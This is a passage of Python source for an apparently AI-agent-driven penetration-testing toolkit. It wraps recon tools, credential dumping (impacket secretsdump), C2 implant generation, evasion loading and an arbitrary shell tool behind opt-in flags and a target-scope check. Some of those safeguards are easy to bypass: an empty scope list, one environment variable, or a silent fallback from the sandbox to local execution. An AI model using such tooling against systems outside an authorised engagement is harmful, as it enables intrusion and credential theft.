#!/usr/bin/env python3
"""
PHALANX Tools v3.6.1 – Gateway, tool runners, interactive sessions, skill registry.
Includes full recon, exploit, post‑exploit, C2, SWARM‑specific tools, and ALL missing tools from v3.3.
All tools respect the sandbox configuration.

Enhanced with:
- Typed tool interfaces with parsers in TOOL_REGISTRY
- Model routing (reasoning vs fast model) in Gateway
- Built‑in parsers for nmap, nuclei, sqlmap, etc.
- Lightweight RAG Tool Optimizer (embedding-based tool retrieval)
- MCP (Model Context Protocol) compatibility layer for dynamic tool servers
- Thread‑safe registry updates (RLock)
- Robust Docker sandbox execution (fixed stdin issue)
- Fixed: command injection risk in sandbox (no shell wrapper)
- Fixed: stealth_rce platform detection for syscalls
- Fixed: scrape fallback parser when lxml missing
- Fixed: sliver fallback subprocess with shlex
- Fixed: nikto flag compatibility
- Fixed: embedding cache thread safety
- Added cloud_metadata_probe and template_injection_test tools
- Added missing tools: theHarvester, enum4linux, gobuster, ffuf, sqlmap, wpscan, whois, dig,
  impacket-secretsdump, impacket-GetNPUsers, feroxbuster, crlfuzz, dalfox, xsstrike, testssl, masscan
- FIX: Added `impacket_getnpusers` alias, `msfconsole` interactive fallback, all registry entries complete.
- FIX: Added missing `run_msfconsole`, `run_searchsploit`, `run_sliver_generate` functions.
- FIX: Added `run_wp_scanner` alias for WordPress scanner (creates proper tool registry entry)
- FIX: Enhanced `run_impacket` to handle domain authentication (username, password, domain)
- FIX: `run_wp_scanner` now uses sandbox executor instead of raw subprocess.
- FIX: `run_impacket` sanitizes credentials to prevent argument injection.
- NEW: Added `winstealth_load` tool for reflective PE loading using WinStealth (Windows evasion).
- FIX: WinStealth import guard added to handle missing library gracefully.
- FIX: run_winstealth_load checks WINSTEALTH_AVAILABLE before using.
- FIX: All tool runners check for presence of required binaries and return clear errors.
- FIX: Sandbox execution uses correct Docker image from config; falls back to local gracefully.
- FIX: Interactive sessions warn when tmux/pexpect missing and fall back to subprocess.
- FIX: `run_wp_scanner` now locates script robustly using both relative and absolute paths.
- FIX: `run_sliver_generate` attempts both `sliver-client` and `sliver` binaries.
- FIX: Added binary existence checks in all major run_* functions to avoid crashes.

# NEW: Reverse Engineering tools added (jadx, apktool, frida, ida, radare2, ollvm, js_reverse)
# NEW: Wi‑Fi scanning tool (run_airodump) for LavaWall Wi‑Fi environment reconnaissance.
# NEW: LavaWall Wi‑Fi scan wrapper for agent harness (run_lavawall_wifi_scan)

# T3MP3ST + OGhidra Enhancements (v3.6):
- Added TOOL_ARSENAL with danger levels and opt-in flags.
- Added egress-scope containment wrapper (_execute_with_scope) for networked tools.
- Added OGhidra integration: run_oghidra_analyze, run_oghidra_conversational.
- Added OGhidra parser (parse_oghidra_output) for malware patterns and function summaries.
- Registered OGhidra tools in TOOL_REGISTRY.
- All network-bound tool runners now use _execute_with_scope to enforce RoE.
- FIXED: run_oghidra_analyze now uses correct 'analyzeHeadless' command with -scriptArgs.
- Added _find_oghidra_plugin_path helper for locating OGhidra plugin.

FIXES in this version:
- Gateway.run_tool and run_tool now always return a dict, never None.
- Added status/summary normalization to ensure consistent output format.
- Handle None results gracefully by converting to an error dict.
- Added robust checks for result type before accessing keys.
- Safe Docker import and fallback.
- Safe WinStealth import with broader exception handling.
- Improved OGhidra analyzeHeadless detection with better error messages.
- Added explicit shutil.which checks for all external command executions.
- Standardized sandbox function call signatures.
- More aggressive embedding cache with thread safety.
- Added warnings filter to suppress SyntaxWarnings from regex patterns (all regex are raw strings).
- FIX: _enforce_scope now handles None config gracefully.
- FIX: run_wp_scanner adds config = {} if None.
- FIX: run_tool now ensures result is a dict even if None.
- FIX: Gateway.run_tool now checks function signature before passing config.
- FIX: run_airodump now accepts config parameter (was missing).
- FIX: _start_oghidra_mcp now uses _find_oghidra_plugin_path() to locate plugin.
- FIX: run_oghidra_analyze uses tempfile.mkdtemp and ensures cleanup in all code paths.
- FIX: Increased pull_ollama_model timeout to 600 seconds.
- FIX: Logger now defined before WinStealth import block to avoid NameError.
- FIX: run_oghidra_analyze now initializes output_dir to None before try block.
- FIX: Gateway.chat now robustly extracts JSON from markdown code fences using regex.

# Raptor-Loop-Hunt Integration (v3.6):
- NEW: run_raptor_round0() – deterministic Round‑0 front‑load for RaptorLoopEngine.
  Performs inventory, SCA (nuclei, ghidra), prior‑art recon, and threat‑model STRIDE.

ADDITIONAL FIXES (v3.6.1):
- run_wp_scanner now supports PHALANX_WP_SCANNER_PATH env var to override script location.
- TOOL_ARSENAL opt-in is now enforced in run_tool and Gateway.run_tool. Tools marked opt_in=True
  require either PHALANX_ALLOW_DANGEROUS=1 environment variable or config['allow_dangerous']=True.
- run_burp_scan is now a minimal placeholder with a clear warning.
- _execute_in_sandbox now logs the actual exception when falling back to local.
- run_airodump now includes a docstring note that CSV parsing is not implemented;
  the caller should parse the output_file.
- run_stealth_rce now uses a more robust syscall lookup for aarch64 and other arches.
- run_interactive now accepts a `prompt_timeout` parameter (default 10s) for initial prompt detection.
- Added `raptor_round0` tool registration in TOOL_REGISTRY and SKILL_REGISTRY.

NEW (v3.6.2):
- Added `shell` tool for arbitrary bash command execution (dangerous, opt-in).
  Requires PHALANX_ALLOW_SHELL=1 or config["allow_shell"] = True.
  Registered in TOOL_REGISTRY and SKILL_REGISTRY with phase "orchestration".
- ReActToolAgent can now invoke the shell tool via the gateway.
"""

import json
import re
import shutil
import subprocess
import threading
import time
import tempfile
import base64
import ctypes
import ctypes.util
import os
import sys
import logging
import inspect
import functools
import shlex
from pathlib import Path
from typing import Any, Dict, Iterator, List, Optional, Callable, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# ------------------------------------------------------------------
# Logger must be defined early to avoid NameError in import blocks
# ------------------------------------------------------------------
logger = logging.getLogger("phalanx_tools")
logging.basicConfig(level=logging.INFO)

import requests

# ------------------------------------------------------------------
# Suppress SyntaxWarnings (e.g., from regex patterns that might be misinterpreted)
# All regex patterns in this file use raw strings, so this is just a safeguard.
# ------------------------------------------------------------------
import warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)

# Optional dependencies
_DOCKER_AVAILABLE = False
_TMUX_AVAILABLE = False
_PEXPECT_AVAILABLE = False
try:
    import docker
    _DOCKER_AVAILABLE = True
except ImportError:
    docker = None
try:
    import pexpect
    _PEXPECT_AVAILABLE = True
except ImportError:
    pexpect = None
if shutil.which("tmux"):
    _TMUX_AVAILABLE = True

# Web scraping – make fake_useragent optional
_SCRAPE_AVAILABLE = False
BeautifulSoup = None
UserAgent = None
try:
    from bs4 import BeautifulSoup
    _SCRAPE_AVAILABLE = True
except ImportError:
    pass
try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None

# Playwright for JS rendering
try:
    from playwright.sync_api import sync_playwright
    _PLAYWRIGHT_AVAILABLE = True
except ImportError:
    _PLAYWRIGHT_AVAILABLE = False

# WinStealth integration (renamed from SindriKit) – gracefully handles missing library
try:
    from phalanx_winstealth import WinStealthWrapper
    WINSTEALTH_AVAILABLE = True
except ImportError:
    WINSTEALTH_AVAILABLE = False
    WinStealthWrapper = None
except Exception as e:
    # Catch any other import-related issues (e.g., missing dependencies)
    logger.warning(f"WinStealth import failed: {e}")
    WINSTEALTH_AVAILABLE = False
    WinStealthWrapper = None

# ------------------------------------------------------------------
# Global config (set by Gateway or main)
# ------------------------------------------------------------------
_GLOBAL_CONFIG = {"sandbox": {"enabled": False, "image": "kalilinux/kali-rolling", "docker_network": "phalanx-net"}}

def set_global_config(config: dict):
    global _GLOBAL_CONFIG
    _GLOBAL_CONFIG.update(config)

def get_global_config() -> dict:
    return _GLOBAL_CONFIG

# ------------------------------------------------------------------
# Global reference to the defense monitor (for LavaWall wrappers)
# ------------------------------------------------------------------
_DEFENSE_MONITOR = None

def set_defense_monitor(monitor):
    """Set the global defense monitor instance for LavaWall tool wrappers."""
    global _DEFENSE_MONITOR
    _DEFENSE_MONITOR = monitor

# ------------------------------------------------------------------
# Docker sandbox client (lazy) with proper error handling
# ------------------------------------------------------------------
_DOCKER_CLIENT = None
_DOCKER_CLIENT_LOCK = threading.Lock()

def get_docker_client():
    global _DOCKER_CLIENT
    if _DOCKER_CLIENT is None and _DOCKER_AVAILABLE:
        with _DOCKER_CLIENT_LOCK:
            if _DOCKER_CLIENT is None:
                try:
                    _DOCKER_CLIENT = docker.from_env()
                except Exception as e:
                    logger.warning(f"Docker client init failed: {e}")
                    _DOCKER_CLIENT = None
    return _DOCKER_CLIENT

# ------------------------------------------------------------------
# TOOL ARSENAL with danger levels and opt-in flags (T3MP3ST style)
# ------------------------------------------------------------------
TOOL_ARSENAL = {
    # Standard tools (always available)
    "nmap": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "nmap_quick": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "whois": {"dangerous": False, "network": True, "opt_in": False, "risk": 1},
    "dig": {"dangerous": False, "network": True, "opt_in": False, "risk": 1},
    "subfinder": {"dangerous": False, "network": True, "opt_in": False, "risk": 1},
    "theharvester": {"dangerous": False, "network": True, "opt_in": False, "risk": 1},
    "enum4linux": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "httpx": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "nuclei": {"dangerous": False, "network": True, "opt_in": False, "risk": 3},
    "naabu": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "katana": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "dnsx": {"dangerous": False, "network": True, "opt_in": False, "risk": 1},
    "gau": {"dangerous": False, "network": True, "opt_in": False, "risk": 1},
    "nikto": {"dangerous": False, "network": True, "opt_in": False, "risk": 3},
    "whatweb": {"dangerous": False, "network": True, "opt_in": False, "risk": 1},
    "gobuster": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "ffuf": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "wpscan": {"dangerous": False, "network": True, "opt_in": False, "risk": 3},
    "scrape": {"dangerous": False, "network": True, "opt_in": False, "risk": 1},
    "wp_scanner": {"dangerous": False, "network": True, "opt_in": False, "risk": 3},
    "feroxbuster": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "crlfuzz": {"dangerous": False, "network": True, "opt_in": False, "risk": 3},
    "dalfox": {"dangerous": False, "network": True, "opt_in": False, "risk": 3},
    "xsstrike": {"dangerous": False, "network": True, "opt_in": False, "risk": 3},
    "testssl": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "masscan": {"dangerous": False, "network": True, "opt_in": False, "risk": 3},
    "airodump": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    "lavawall_wifi_scan": {"dangerous": False, "network": True, "opt_in": False, "risk": 2},
    
    # Dangerous tools (require approval / opt-in)
    "msfconsole": {"dangerous": True, "network": True, "opt_in": True, "risk": 9},
    "metasploit": {"dangerous": True, "network": True, "opt_in": True, "risk": 9},
    "searchsploit": {"dangerous": True, "network": False, "opt_in": True, "risk": 5},
    "sqlmap": {"dangerous": True, "network": True, "opt_in": True, "risk": 7},
    "sqlmap_detect": {"dangerous": True, "network": True, "opt_in": True, "risk": 7},
    "impacket_secretsdump": {"dangerous": True, "network": True, "opt_in": True, "risk": 8},
    "impacket_smbexec": {"dangerous": True, "network": True, "opt_in": True, "risk": 8},
    "secretsdump": {"dangerous": True, "network": True, "opt_in": True, "risk": 8},
    "getnpusers": {"dangerous": True, "network": True, "opt_in": True, "risk": 7},
    "impacket_getnpusers": {"dangerous": True, "network": True, "opt_in": True, "risk": 7},
    "sliver_generate": {"dangerous": True, "network": True, "opt_in": True, "risk": 7},
    "sliver_sessions": {"dangerous": True, "network": True, "opt_in": True, "risk": 6},
    "stealth_rce": {"dangerous": True, "network": False, "opt_in": True, "risk": 9},
    "template_injection_test": {"dangerous": True, "network": True, "opt_in": True, "risk": 7},
    "cloud_metadata_probe": {"dangerous": True, "network": True, "opt_in": True, "risk": 5},
    "winstealth_load": {"dangerous": True, "network": False, "opt_in": True, "risk": 8},
    "shell": {"dangerous": True, "network": False, "opt_in": True, "risk": 9},
    
    # Reverse engineering tools (generally safe)
    "ghidra_analyze": {"dangerous": False, "network": False, "opt_in": False, "risk": 1},
    "jadx": {"dangerous": False, "network": False, "opt_in": False, "risk": 1},
    "apktool": {"dangerous": False, "network": False, "opt_in": False, "risk": 1},
    "frida": {"dangerous": False, "network": False, "opt_in": False, "risk": 2},
    "ida": {"dangerous": False, "network": False, "opt_in": False, "risk": 1},
    "radare2": {"dangerous": False, "network": False, "opt_in": False, "risk": 1},
    "ollvm_deobfuscate": {"dangerous": False, "network": False, "opt_in": False, "risk": 1},
    "js_reverse": {"dangerous": False, "network": False, "opt_in": False, "risk": 1},
    
    # OGhidra tools
    "oghidra": {"dangerous": False, "network": False, "opt_in": False, "risk": 1},
    "oghidra_chat": {"dangerous": False, "network": False, "opt_in": False, "risk": 1},
    
    # Raptor tools
    "raptor_round0": {"dangerous": False, "network": True, "opt_in": False, "risk": 1},
}

# Enable full arsenal if environment variable is set
if os.environ.get("PHALANX_FULL_ARSENAL", "0") == "1":
    for tool, info in TOOL_ARSENAL.items():
        if info.get("opt_in"):
            info["opt_in"] = False  # Enable all tools

def _is_tool_opt_in_allowed(tool_name: str, config: dict) -> bool:
    """Check if a tool marked opt_in is allowed to run."""
    if tool_name not in TOOL_ARSENAL:
        return True  # unknown tools are allowed (or we could deny)
    info = TOOL_ARSENAL[tool_name]
    if not info.get("opt_in", False):
        return True
    # Allow if environment variable is set
    if os.environ.get("PHALANX_ALLOW_DANGEROUS", "0") == "1":
        return True
    # Allow if config has allow_dangerous = True
    if config and config.get("allow_dangerous", False):
        return True
    # Special case for shell tool: allow if PHALANX_ALLOW_SHELL or config allow_shell
    if tool_name == "shell":
        if os.environ.get("PHALANX_ALLOW_SHELL", "0") == "1":
            return True
        if config and config.get("allow_shell", False):
            return True
    return False

# ------------------------------------------------------------------
# Egress-scope containment (T3MP3ST)
# ------------------------------------------------------------------
def _enforce_scope(target: str, config: dict) -> Tuple[bool, str]:
    """Enforce egress-scope containment for networked tools."""
    if config is None:
        config = {}
    roe = config.get("engagement", {}).get("default_roe", {})
    allowed = roe.get("allowed_targets", [])
    if allowed and target not in allowed:
        return False, f"Target {target} not in RoE allowed list (egress guard)"
    return True, "In scope"

def _execute_with_scope(cmd: List[str], target: str, timeout: int, config: dict,
                        input_data: Optional[str] = None) -> Dict:
    """Execute a command with scope enforcement for networked tools."""
    allowed, msg = _enforce_scope(target, config)
    if not allowed:
        return {"output": "", "error": f"Scope guard: {msg}", "rc": -1}
    return _execute_in_sandbox(cmd, timeout, input_data, config)

# ------------------------------------------------------------------
# Local execution function (defined before sandbox to avoid NameError)
# ------------------------------------------------------------------
def _execute_local(cmd: List[str], timeout: int = 120, input_data: Optional[str] = None) -> Dict:
    # Check first command existence
    if not cmd:
        return {"output": "", "error": "Empty command", "rc": -1}
    if not shutil.which(cmd[0]):
        return {"output": "", "error": f"Tool '{cmd[0]}' not found", "rc": -1}
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input_data)
        return {
            "output": (result.stdout + result.stderr).strip(),
            "error": None if result.returncode == 0 else result.stderr.strip()[:500],
            "rc": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"output": "", "error": f"Timed out after {timeout}s", "rc": -1}
    except Exception as e:
        return {"output": "", "error": str(e), "rc": -1}

# ------------------------------------------------------------------
# Unified execution: respects sandbox configuration (no shell injection)
# ------------------------------------------------------------------
def _execute_in_sandbox(cmd: List[str], timeout: int = 120, input_data: Optional[str] = None,
                        config: Optional[dict] = None) -> Dict:
    """
    Run a command in a Docker sandbox if enabled.
    If input_data is provided (stdin), execution falls back to local because
    the Docker sandbox does not currently support stdin redirection.
    """
    cfg = config or _GLOBAL_CONFIG
    sandbox_cfg = cfg.get("sandbox", {})
    if sandbox_cfg.get("enabled", False):
        docker_client = get_docker_client()
        if docker_client:
            image = sandbox_cfg.get("image", "kalilinux/kali-rolling")
            network = sandbox_cfg.get("docker_network", "phalanx-net")
            try:
                if input_data is not None:
                    logger.warning("Docker sandbox with stdin not supported, falling back to local")
                    return _execute_local(cmd, timeout, input_data)

                # Run command directly without shell wrapper (no injection risk)
                container = docker_client.containers.run(
                    image,
                    command=cmd,          # list of strings, not joined with shell
                    network=network,
                    detach=True,
                    stdin_open=False,
                    tty=False,
                    stdout=True,
                    stderr=True,
                )
                start = time.time()
                while time.time() - start < timeout:
                    container.reload()
                    if container.status in ("exited", "dead"):
                        break
                    time.sleep(0.5)
                else:
                    container.kill()
                    container.remove()
                    return {"output": "", "error": f"Sandbox timed out after {timeout}s", "rc": -1}

                result = container.wait()
                logs = container.logs(stdout=True, stderr=True).decode('utf-8', errors='replace')
                container.remove()
                return {"output": logs.strip(), "error": None, "rc": result["StatusCode"]}
            except Exception as e:
                logger.error(f"Docker sandbox execution failed: {e}, falling back to local")
                return _execute_local(cmd, timeout, input_data)
    return _execute_local(cmd, timeout, input_data)

# ------------------------------------------------------------------
# Interactive session manager (tmux + pexpect)
# ------------------------------------------------------------------
class InteractiveSession:
    def __init__(self, tool: str, command: str, expect_prompt: str = None):
        self.tool = tool
        self.command = command
        self.expect_prompt = expect_prompt or r"[$#>]"
        self.session_name = f"phalanx_{tool}_{int(time.time())}"
        self.child = None
        self._started = False

    def start(self, timeout=10) -> bool:
        if not (_TMUX_AVAILABLE and _PEXPECT_AVAILABLE):
            return False
        try:
            subprocess.run(["tmux", "new-session", "-d", "-s", self.session_name, self.tool], check=True)
            subprocess.run(["tmux", "send-keys", "-t", self.session_name, self.command, "Enter"], check=True)
            time.sleep(0.5)
            self.child = subprocess.Popen(
                ["tmux", "capture-pane", "-p", "-t", self.session_name],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            # Use a timeout for prompt detection
            start_time = time.time()
            while time.time() - start_time < timeout:
                time.sleep(0.5)
                out, _ = self.child.communicate(timeout=0.1)
                if out and re.search(self.expect_prompt, out):
                    self._started = True
                    return True
            return False
        except Exception as e:
            logger.error(f"Interactive session start failed: {e}")
            return False

    def send(self, text: str, expect_response=True, timeout=30) -> str:
        if not self._started:
            return ""
        try:
            subprocess.run(["tmux", "send-keys", "-t", self.session_name, text, "Enter"], check=True)
            if expect_response:
                time.sleep(1)
                for _ in range(timeout * 2):
                    time.sleep(0.5)
                    out, _ = self.child.communicate(timeout=0.1)
                    if out and re.search(self.expect_prompt, out):
                        return out
                return self._get_output()
            return ""
        except Exception as e:
            logger.error(f"Send failed: {e}")
            return ""

    def _get_output(self) -> str:
        try:
            result = subprocess.run(["tmux", "capture-pane", "-t", self.session_name, "-p"], capture_output=True, text=True)
            return result.stdout
        except:
            return ""

    def close(self):
        if self._started:
            subprocess.run(["tmux", "kill-session", "-t", self.session_name], stderr=subprocess.DEVNULL)
            self._started = False

def run_interactive(tool: str, command: str, timeout=60, expect_prompt=None, send_input=None, prompt_timeout=10) -> Dict:
    session = InteractiveSession(tool, command, expect_prompt)
    if not session.start(timeout=prompt_timeout):
        try:
            proc = subprocess.run(command.split(), capture_output=True, text=True, timeout=timeout)
            return {"output": proc.stdout, "error": proc.stderr, "rc": proc.returncode}
        except Exception as e:
            return {"output": "", "error": f"Interactive session not available: {e}", "rc": -1}
    output = ""
    if send_input and expect_prompt:
        output = session.send(send_input, expect_response=True, timeout=timeout)
    else:
        time.sleep(timeout)
        output = session._get_output()
    session.close()
    return {"output": output, "error": None, "rc": 0}

# ------------------------------------------------------------------
# Built‑in parsers (structured output extraction)
# ------------------------------------------------------------------
def parse_nmap_output(raw_output: str, args: Dict) -> Dict:
    ports_open = []
    services = []
    for line in raw_output.splitlines():
        m = re.match(r"(\d+)/\w+\s+open\s+(\S+)", line)
        if m:
            ports_open.append(m.group(1))
            services.append(m.group(2))
    os_match = re.search(r"OS guess:\s+(.+?)(?:\n|$)", raw_output)
    os_guess = os_match.group(1) if os_match else None
    return {
        "findings": [{"port": p, "service": s} for p, s in zip(ports_open, services)],
        "evidence": ports_open[:10],
        "next_hints": [f"Check service {s}" for s in set(services)],
        "confidence": 0.9 if ports_open else 0.5,
        "open_ports": ports_open,
        "services": services,
        "os_guess": os_guess
    }

def parse_nuclei_output(raw_output: str, args: Dict) -> Dict:
    findings = []
    for line in raw_output.splitlines():
        if not line.strip():
            continue
        try:
            data = json.loads(line)
            findings.append({
                "name": data.get("info", {}).get("name", "Unknown"),
                "severity": data.get("info", {}).get("severity", "info"),
                "description": data.get("info", {}).get("description", ""),
                "matched_at": data.get("matched-at", ""),
                "cve_id": data.get("info", {}).get("classification", {}).get("cve-id", [])
            })
        except:
            pass
    return {
        "findings": findings,
        "evidence": [f["name"] for f in findings[:5]],
        "next_hints": [f"Exploit {f['name']}" for f in findings[:3]],
        "confidence": 0.8 if findings else 0.3
    }

def parse_sqlmap_output(raw_output: str, args: Dict) -> Dict:
    injectable = "injectable" in raw_output.lower()
    db_match = re.search(r"back-end DBMS:\s+(.+?)(?:\n|$)", raw_output, re.I)
    dbms = db_match.group(1) if db_match else None
    return {
        "findings": [{"injectable": injectable, "dbms": dbms}] if injectable else [],
        "evidence": ["SQL injection detected"] if injectable else [],
        "next_hints": ["Dump data using --dump"] if injectable else [],
        "confidence": 0.95 if injectable else 0.0,
        "injectable": injectable,
        "dbms": dbms
    }

def parse_subfinder_output(raw_output: str, args: Dict) -> Dict:
    subs = [l.strip() for l in raw_output.splitlines() if l.strip()]
    return {
        "findings": [{"subdomain": s} for s in subs],
        "evidence": subs[:10],
        "next_hints": ["Run httpx on discovered subdomains"] if subs else [],
        "confidence": 0.9 if subs else 0.2,
        "subdomains": subs
    }

def parse_httpx_output(raw_output: str, args: Dict) -> Dict:
    urls = [l.strip() for l in raw_output.splitlines() if l.strip()]
    return {
        "findings": [{"url": u} for u in urls],
        "evidence": urls[:10],
        "next_hints": ["Run nuclei on discovered URLs"] if urls else [],
        "confidence": 0.85 if urls else 0.1,
        "urls": urls
    }

def parse_naabu_output(raw_output: str, args: Dict) -> Dict:
    ports = re.findall(r"(\d+)\s+open", raw_output)
    return {
        "findings": [{"port": p} for p in ports],
        "evidence": ports[:10],
        "next_hints": ["Run nmap -sV on open ports"] if ports else [],
        "confidence": 0.8 if ports else 0.2,
        "ports": ports
    }

def parse_ghidra_output(raw_output: str, args: Dict) -> Dict:
    interesting = []
    if "INTERESTING_STRINGS:" in raw_output:
        part = raw_output.split("INTERESTING_STRINGS:")[1].splitlines()[0]
        interesting = part.split(",")
    func_count = raw_output.count("Function at")
    return {
        "findings": [{"interesting_string": s} for s in interesting[:10]],
        "evidence": interesting[:5],
        "next_hints": ["Check for hardcoded credentials"] if interesting else [],
        "confidence": 0.7 if interesting else 0.3,
        "interesting_strings": interesting,
        "functions_count": func_count
    }

def parse_scrape_output(raw_output: str, args: Dict) -> Dict:
    return {
        "findings": args.get("parsed", {}).get("emails", []),
        "evidence": args.get("parsed", {}).get("emails", [])[:5],
        "next_hints": ["Check for forms and links"],
        "confidence": 0.9
    }

# ------------------------------------------------------------------
# NEW: OGhidra Parser
# ------------------------------------------------------------------
def parse_oghidra_output(raw_output: str, args: Dict) -> Dict:
    """Parse OGhidra output with malware patterns and function summaries."""
    try:
        data = json.loads(raw_output)
    except:
        return {"findings": [], "error": "Invalid JSON output"}
    
    findings = []
    # Malware patterns
    for pattern in data.get("malware_patterns", []):
        findings.append({
            "type": pattern.get("type"),
            "description": pattern.get("description"),
            "mitre_id": pattern.get("mitre_id"),
            "severity": "high" if pattern.get("risk") == "critical" else "medium"
        })
    
    # High-risk functions
    for func in data.get("high_risk_functions", []):
        findings.append({
            "type": "high_risk_function",
            "name": func.get("name"),
            "reason": func.get("reason"),
            "calls": func.get("calls", [])[:5]
        })
    
    return {
        "findings": findings,
        "functions_count": data.get("functions_analyzed", 0),
        "malware_detected": len(data.get("malware_patterns", [])),
        "confidence": 0.9 if findings else 0.3,
        "summary": data.get("executive_summary", ""),
        "recommendations": data.get("recommendations", [])
    }

# ------------------------------------------------------------------
# OGhidra helper functions
# ------------------------------------------------------------------
_OGHIDRA_MCP_PROCESS = None
_OGHIDRA_PLUGIN_CHECKED = False
_OGHIDRA_PLUGIN_INSTALLED = False

def _check_oghidra_plugin() -> bool:
    """Check if OGhidraMCP plugin is installed in Ghidra."""
    global _OGHIDRA_PLUGIN_CHECKED, _OGHIDRA_PLUGIN_INSTALLED
    if _OGHIDRA_PLUGIN_CHECKED:
        return _OGHIDRA_PLUGIN_INSTALLED
    _OGHIDRA_PLUGIN_CHECKED = True
    
    # Check common Ghidra extension paths
    ghidra_ext_dir = Path.home() / ".ghidra" / "Extensions"
    if not ghidra_ext_dir.exists():
        _OGHIDRA_PLUGIN_INSTALLED = False
        return False
    
    # Look for OGhidraMCP zip or directory
    for ext in ghidra_ext_dir.glob("*OGhidra*"):
        if ext.exists():
            _OGHIDRA_PLUGIN_INSTALLED = True
            return True
    
    # Check if the plugin is in the Ghidra installation
    ghidra_path = os.environ.get("GHIDRA_INSTALL_DIR")
    if ghidra_path:
        plugin_path = Path(ghidra_path) / "Extensions" / "GHIDRA" / "OGhidraMCP"
        if plugin_path.exists():
            _OGHIDRA_PLUGIN_INSTALLED = True
            return True
    
    _OGHIDRA_PLUGIN_INSTALLED = False
    return False

def _find_oghidra_plugin_path() -> Optional[Path]:
    """
    Locate the OGhidraMCP plugin directory.
    Returns Path if found, else None.
    """
    # Check user extensions
    ext_dir = Path.home() / ".ghidra" / "Extensions"
    if ext_dir.exists():
        for item in ext_dir.glob("*OGhidra*"):
            if item.is_dir() and (item / "OGhidraMCP.py").exists():
                return item
    # Check if in Ghidra installation
    ghidra_path = os.environ.get("GHIDRA_INSTALL_DIR")
    if ghidra_path:
        install_ext = Path(ghidra_path) / "Extensions" / "GHIDRA"
        if install_ext.exists():
            for item in install_ext.glob("*OGhidra*"):
                if item.is_dir() and (item / "OGhidraMCP.py").exists():
                    return item
    logger.warning("OGhidraMCP plugin not found.")
    return None

def _is_oghidra_mcp_running() -> bool:
    """Check if OGhidra MCP server is running on port 8080."""
    global _OGHIDRA_MCP_PROCESS
    if _OGHIDRA_MCP_PROCESS and _OGHIDRA_MCP_PROCESS.poll() is None:
        return True
    # Also try to connect to the port
    try:
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex(('localhost', 8080))
        sock.close()
        return result == 0
    except:
        return False

def _start_oghidra_mcp(binary_path: str):
    """Start the OGhidra MCP server for the given binary."""
    global _OGHIDRA_MCP_PROCESS
    if _is_oghidra_mcp_running():
        return
    
    # Locate plugin path using helper
    plugin_path = _find_oghidra_plugin_path()
    if not plugin_path:
        logger.warning("OGhidraMCP plugin not found; cannot start MCP server")
        return
    
    ghidra_path = os.environ.get("GHIDRA_INSTALL_DIR")
    if not ghidra_path:
        logger.warning("GHIDRA_INSTALL_DIR not set; cannot start OGhidra MCP")
        return
    
    # Command to start headless Ghidra with OGhidraMCP server mode
    # Use the located plugin_path
    cmd = [
        str(Path(ghidra_path) / "support" / "analyzeHeadless"),
        str(Path.cwd() / "phalanx" / "ghidra_projects" / "temp"),
        "OGhidraProject",
        "-import", binary_path,
        "-scriptPath", str(plugin_path),
        "-postScript", "OGhidraMCP_Server.py",
        "--server-port", "8080"
    ]
    try:
        _OGHIDRA_MCP_PROCESS = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)  # Give it time to start
        logger.info(f"OGhidra MCP server started on port 8080 for {binary_path}")
    except Exception as e:
        logger.error(f"Failed to start OGhidra MCP server: {e}")

# ------------------------------------------------------------------
# Tool runners (raw output only – parsing moved to registry parsers)
# With binary existence checks for each tool
# Modified to use _execute_with_scope for network tools
# ------------------------------------------------------------------

def run_nmap(target: str, ports: str = "1-65535", flags: str = "-sV -sC --open", timeout: int = 300, config: Optional[dict] = None, **kwargs) -> Dict:
    if not shutil.which("nmap"):
        return {"tool": "nmap", "target": target, "output": "", "error": "nmap not found. Install via apt/brew or rebuild Docker image.", "rc": -1}
    if 'options' in kwargs:
        flags = kwargs['options']
    if '-p' in flags:
        cmd = ["nmap"] + flags.split() + [target]
    else:
        cmd = ["nmap"] + flags.split() + ["-p", ports, target]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "nmap", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_nmap_quick(target: str, timeout=60, config=None) -> Dict:
    if not shutil.which("nmap"):
        return {"tool": "nmap_quick", "target": target, "output": "", "error": "nmap not found.", "rc": -1}
    cmd = ["nmap", "-sV", "--open", "--top-ports", "1000", target]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "nmap_quick", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_whois(target: str, timeout=30, config=None) -> Dict:
    if not shutil.which("whois"):
        return {"tool": "whois", "target": target, "output": "", "error": "whois not found.", "rc": -1}
    res = _execute_with_scope(["whois", target], target, timeout, config)
    return {"tool": "whois", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_dig(target: str, record="ANY", timeout=15, config=None) -> Dict:
    if not shutil.which("dig"):
        return {"tool": "dig", "target": target, "output": "", "error": "dig not found.", "rc": -1}
    res = _execute_with_scope(["dig", target, record, "+noall", "+answer"], target, timeout, config)
    return {"tool": "dig", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_subfinder(domain: str, timeout=60, config=None) -> Dict:
    if not shutil.which("subfinder"):
        return {"tool": "subfinder", "target": domain, "output": "", "error": "subfinder not found. Install with: go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest", "rc": -1}
    res = _execute_with_scope(["subfinder", "-d", domain, "-silent"], domain, timeout, config)
